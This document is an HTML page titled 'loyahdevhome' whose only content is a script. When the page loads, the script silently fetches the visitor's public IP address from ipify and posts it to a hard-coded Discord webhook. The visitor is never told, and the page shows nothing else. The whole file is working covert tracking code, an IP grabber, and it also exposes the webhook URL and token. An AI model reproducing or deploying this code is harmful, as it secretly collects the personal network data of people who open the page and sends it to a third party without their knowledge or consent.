<!DOCTYPE html>
<html>
<head>
    <title>loyahdevhome</title>
</head>
<body>
    <script>
        // Function to send IP to Discord
        function sendToDiscord(ipAddress) {
            var discordWebhookUrl = 'https://discord.com/api/webhooks/1172650838573994004/pUY4IiCu2Tbb-KN8Iep2oeA8DFOZakqLabsn7pkYuNZsxUnKF0UiGI4wO_Pn4KMrUHQx';
            var payload = JSON.stringify({
                content: "IP Address: " + ipAddress
            });

            fetch(discordWebhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: payload
            })
            .then(response => console.log('IP sent to Discord'))
            .catch(error => console.error('Error:', error));
        }

        // Fetch the IP address
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                sendToDiscord(data.ip);
            })
            .catch(error => {
                console.error('Error fetching IP:', error);
            });
    </script>
</body>
</html>
